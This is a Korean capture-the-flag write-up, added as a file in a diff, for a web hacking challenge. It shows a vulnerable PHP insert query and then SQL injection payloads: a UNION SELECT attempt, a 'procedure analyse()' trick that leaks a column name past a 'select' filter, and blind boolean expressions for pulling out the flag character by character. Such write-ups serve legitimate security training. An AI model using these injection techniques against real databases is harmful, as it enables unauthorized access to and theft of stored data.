@@ -1,0 +1,31 @@
+문제에 접속하니 마우스로 캐릭터를 옮기면서 점수를 쌓는 게임이 실행되고 있다.
+
+랭크가 있어서 들어가보았더니 랭크와 함께 쿼리문 한개가 보인다.
+
+mysqli_query($db,"insert into chall55 values('{$_SESSION['id']}','".trim($_POST['score'])."','{$flag}')");
+
+아마 위 쿼리를 통해 랭크에 사용자가 등록되는 것 같다.
+
+레코드에는 id , score , flag가 저장되며 flag값을 구하는 것이 목표인 것 같다.
+
+기록된 사용자들의 score를 누르면 score값이 get방식으로 전달되면서 score값에 해당하는 사용자의 id,score 정보가 출력된다. 
+
+select id,//,score from [table_name] where score=0 union select flag
+
+위와 같은 쿼리를 짜서 0 union select flag를 넣어보았다.
+
+no hack이라는 문구가 뜬다. 어떤게 걸렸나 확인해보니 select가 걸렸다.
+select가 필터링에 걸렸으니 우선 procedure analyse와 limit를 이용해 column명부터 구해보자
+
+select id,//,score from [table_name] where score=1 limit 2,1 procedure analyse()
+
+flag가 저장된 column으로 예상되는 값이 아래와 같이 나왔다 위를 이용하여 flag값을 구해보자
+p4ssw0rd_1123581321
+
+if(length(p4ssw0rd_1123581321)like({i}),2,1) ==> 31자리
+if((ord(right(left(p4ssw0rd_1123581321,{i}),1)))like({j}),2,1)
+(webhacking_55-1.py)
+
+클리어!!
+
+
